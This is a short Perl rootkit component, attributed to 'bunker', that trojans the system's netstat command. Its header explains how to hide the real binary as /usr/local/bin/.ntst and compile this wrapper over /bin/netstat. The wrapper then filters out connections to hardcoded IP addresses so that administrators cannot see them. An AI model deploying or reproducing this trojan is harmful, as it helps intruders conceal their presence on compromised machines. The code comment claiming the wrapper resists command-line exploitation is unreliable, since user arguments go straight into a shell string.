#!/usr/bin/perl -w
#
# Simple wrapper around netstat (filters hardcoded IP)
# by bunker - http://rawlab.altervista.org
# 
# Edit wnetstat.pl and change harcoded IP.
# Copy /bin/netstat in /usr/local/bin/.ntst.
#
# Compile the source with "perlcc -o /bin/netstat wnetstat.pl"
#
use strict;
# original netstat
my $ntst_orig = "/usr/local/bin/.ntst";

# hide these
my $hide      = '127.0.0.1\|192.168.0.1';
# Wrap 
# and work with I/O redirection to avoid command line exploitation
system "$ntst_orig @ARGV 2>&1 | grep -v \"$hide\" 2>/dev/null";
